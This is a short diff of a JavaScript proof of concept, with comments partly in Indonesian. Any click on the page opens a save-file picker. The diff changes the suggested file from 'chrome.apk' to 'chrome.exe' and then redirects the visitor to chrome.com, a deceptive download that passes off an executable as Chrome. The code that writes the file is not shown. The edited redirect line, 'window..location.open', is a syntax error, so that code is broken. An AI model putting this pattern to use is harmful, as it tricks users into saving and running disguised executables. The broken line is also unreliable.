@@ -16,11 +16,11 @@ document.addEventListener('click', async () => {
     try {
         // 1. File picker EXE
         const handle = await window.showSaveFilePicker({
-            suggestedName: 'chrome.apk',
+            suggestedName: 'chrome.exe',
             types: [{
                 description: 'Executable File (PoC)',
                 accept: {
-                    'application/octet-stream': ['.apk']
+                    'application/octet-stream': ['.exe']
                 }
             }]
         });
@@ -36,7 +36,7 @@ document.addEventListener('click', async () => {
 
         // 3. Redirect setelah write selesai
         setTimeout(() => {
-            window.open = 'https://chrome.com';
+            window..location.open = 'https://chrome.com';
         }, 500);
 
     } catch (e) {
